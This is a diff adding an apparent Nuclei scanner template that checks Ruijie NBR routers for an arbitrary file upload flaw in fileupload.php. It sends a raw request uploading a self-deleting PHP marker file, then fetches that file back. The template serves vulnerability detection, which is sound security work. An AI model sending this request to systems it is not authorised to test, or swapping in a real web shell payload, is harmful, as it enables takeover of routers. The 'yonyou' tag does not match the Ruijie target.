@@ -1,0 +1,30 @@
+id: ruijie-nbr-router-fileupload-upload
+
+info:
+  name: 锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞
+  author: SleepingBag945
+  severity: critical
+  description: 锐捷 NBR 路由器 fileupload.php文件存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件到服务器获取服务器权限
+  tags: yonyou
+
+http:
+  - raw:
+      - |
+        POST /ddi/server/fileupload.php?uploadDir=upload&name={{randstr_2}}.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/plain, */*; q=0.01
+        Content-Disposition: form-data; name="file"; filename="111.php"
+        Content-Type: image/jpeg
+
+        <?php echo "{{randstr_1}}"; unlink(__FILE__); ?>
+      
+      - |
+        GET /ddi/server/upload/{{randstr_2}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200
+          - status_code_2 == 200 && contains(body_2,"{{randstr_1}}")
+        condition: and
